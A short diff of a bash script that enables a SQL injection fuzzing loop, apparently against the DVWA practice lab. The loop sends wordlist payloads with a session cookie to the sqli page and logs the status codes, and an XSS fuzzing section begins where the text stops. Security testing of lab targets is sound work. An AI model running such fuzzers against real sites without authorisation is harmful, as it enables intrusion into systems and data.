@@ -32,15 +32,15 @@ curl -s -b "$COOKIE_STR" \
   "$BASE_URL/security.php" >/dev/null
 
 # --- SQL Injection Fuzzing ---
-# echo -e "\n[*] Starting SQL Injection fuzzing..."
-# while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
-#   ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
-#   RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
-#     -b "$COOKIE_STR" \
-#     "$BASE_URL/vulnerabilities/sqli/?id=${ENCODED}&Submit=Submit")
+echo -e "\n[*] Starting SQL Injection fuzzing..."
+while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
+  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
+  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+    -b "$COOKIE_STR" \
+    "$BASE_URL/vulnerabilities/sqli/?id=${ENCODED}&Submit=Submit")
 
-#   echo "[SQLi] Payload: $PAYLOAD | Status: $RESPONSE"
-# done <"$SQL_WORDLIST"
+  echo "[SQLi] Payload: $PAYLOAD | Status: $RESPONSE"
+done <"$SQL_WORDLIST"
 
 # --- XSS Fuzzing ---
 echo -e "\n[*] Starting XSS fuzzing..."
